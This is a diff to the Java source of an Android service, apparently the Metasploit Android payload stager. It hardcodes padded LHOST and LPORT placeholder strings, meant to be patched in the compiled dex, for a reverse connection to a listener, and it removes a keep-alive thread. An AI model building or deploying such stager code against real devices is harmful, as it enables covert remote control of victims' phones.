@@ -16,8 +16,11 @@ import android.widget.Toast;
 
 public class StageService extends Service {
 
+	 // avoid re-ordering the strings in classes.dex - append XXXX
+    public static final String LHOST = "XXXX127.0.0.1                       ";
+    public static final String LPORT = "YYYY4444                            "; 
+	
 	int mStartMode;
-	private String LHOST, LPORT;
 	private boolean isRunning = true;
 	private Socket msgsock;
 	
@@ -31,27 +34,9 @@ public class StageService extends Service {
 	public void onCreate() {
 		
 		Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show();
-		SharedPreferences prefs = this.getSharedPreferences("com.metasploit.stage", Context.MODE_PRIVATE);
-		LHOST = prefs.getString("LHOST", "127.0.0.1"); 
-		LPORT = prefs.getString("LPORT", "4444"); 
-		
-		startAsync(); 
-		
-		new Thread()
-		{
-		    @Override
-		    public void run() {
-		        try {
-		            while(isRunning) {
-		                sleep(1000);
-		                
-		            }
-		        } catch (InterruptedException e) {
-		            e.printStackTrace();
-		        }
-		    }
-		}.start();
 
+	
+		startAsync(); 
     }
 	
 
